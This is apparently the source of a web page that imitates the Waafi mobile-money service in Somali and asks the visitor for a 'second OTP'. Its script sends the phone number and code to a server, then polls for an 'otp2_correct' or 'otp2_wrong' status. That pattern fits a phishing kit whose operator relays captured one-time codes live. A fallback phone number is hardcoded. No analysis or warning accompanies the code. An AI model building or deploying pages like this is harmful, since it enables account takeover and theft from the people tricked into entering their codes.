<!DOCTYPE html>
<html lang="so">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Waafi - OTP 2</title>
    <style>
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { margin: 0; padding: 0; background-color: #fff; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
        
        .container { flex: 1; padding: 40px 20px; text-align: center; }
        h2 { font-size: 22px; color: #333; margin-bottom: 10px; font-weight: 500; }
        p { font-size: 14px; color: #666; line-height: 1.5; margin-bottom: 5px; }
        .phone-num { font-weight: bold; color: #333; margin-bottom: 30px; }

        .otp-inputs { display: flex; justify-content: center; gap: 8px; margin: 30px 0; }
        .otp-inputs input {
            width: 45px; height: 55px; border: 1.5px solid #ccc; border-radius: 8px;
            text-align: center; font-size: 20px; font-weight: bold; outline: none;
        }
        .otp-inputs input:focus { border-color: #2ecc71; border-width: 2px; }

        .resend-text { font-size: 13px; color: #888; margin-bottom: 30px; }

        .btn-verify {
            width: 100%; max-width: 300px; padding: 15px; border-radius: 10px;
            border: none; background-color: #e0e0e0; color: #a0a0a0;
            font-size: 16px; font-weight: bold; cursor: not-allowed; text-transform: uppercase;
        }
        .btn-verify.active { background-color: #2ecc71; color: white; cursor: pointer; }

        .footer {
            position: relative; height: 250px; background: linear-gradient(to bottom, #2ecc71, #27ae60);
            border-top-left-radius: 50% 100px; border-top-right-radius: 50% 100px;
            display: flex; justify-content: center; align-items: center; color: white;
            font-size: 12px; margin-top: auto;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>Xaqiijinta OTP-ga Labaad</h2>
    <p>Geli OTP-ga labaad ee loogu diray lambarka taleefankaaga</p>
    <div class="phone-num" id="display-phone">+252*********</div>

    <div class="otp-inputs">
        <input type="text" maxlength="1" inputmode="numeric">
        <input type="text" maxlength="1" inputmode="numeric">
        <input type="text" maxlength="1" inputmode="numeric">
        <input type="text" maxlength="1" inputmode="numeric">
        <input type="text" maxlength="1" inputmode="numeric">
        <input type="text" maxlength="1" inputmode="numeric">
    </div>

    <div class="resend-text">Koodka mar kale u dir 13 ilbiriqsi</div>

    <button class="btn-verify" id="verify-btn">XAQIIJI OTP GA LABAAD</button>
    <div id="status-msg" style="margin-top:15px; font-size:14px;"></div>
</div>

<div class="footer">
    © 2026 Waafi Soomaaliya
</div>

<script>
const phone = localStorage.getItem('userPhone') || "+252616286903";
document.getElementById('display-phone').innerText = phone;

const inputs = document.querySelectorAll('.otp-inputs input');
const btn = document.getElementById('verify-btn');

// Input handling
inputs.forEach((input, index) => {
    input.addEventListener('input', () => {
        input.value = input.value.replace(/\D/g, ''); // numbers only

        if (input.value && index < inputs.length - 1) {
            inputs[index + 1].focus();
        }
        checkFull();
    });

    input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !input.value && index > 0) {
            inputs[index - 1].focus();
        }
    });
});

function checkFull() {
    const code = Array.from(inputs).map(i => i.value).join('');
    if (code.length === 6) {
        btn.classList.add('active');
    } else {
        btn.classList.remove('active');
    }
}

// Button click
btn.addEventListener('click', submitOtp);

async function submitOtp() {
    if (!btn.classList.contains('active')) return;

    const otp = Array.from(inputs).map(i => i.value).join('');
    if (otp.length < 6) return;

    document.getElementById('status-msg').innerText = "Fadlan sug...";

    try {
        const res = await fetch('/api/verify-second-otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone, otp })
        });

        if (res.ok) {
            startPolling();
        } else {
            throw new Error();
        }
    } catch {
        document.getElementById('status-msg').innerText = "❌ Khalad ayaa dhacay.";
    }
}

function startPolling() {
    const interval = setInterval(async () => {
        try {
            const res = await fetch(`/api/check-status?phone=${phone}`);
            const data = await res.json();

            if (data.status === "otp2_correct") {
                clearInterval(interval);
                window.location.href = "/success.html";
            } 
            else if (data.status === "otp2_wrong") {
                document.getElementById('status-msg').innerText = "❌ Koodka waa khalad.";
                clearInterval(interval);
            }
        } catch {
            clearInterval(interval);
        }
    }, 3000);
}
</script>

</body>
</html>
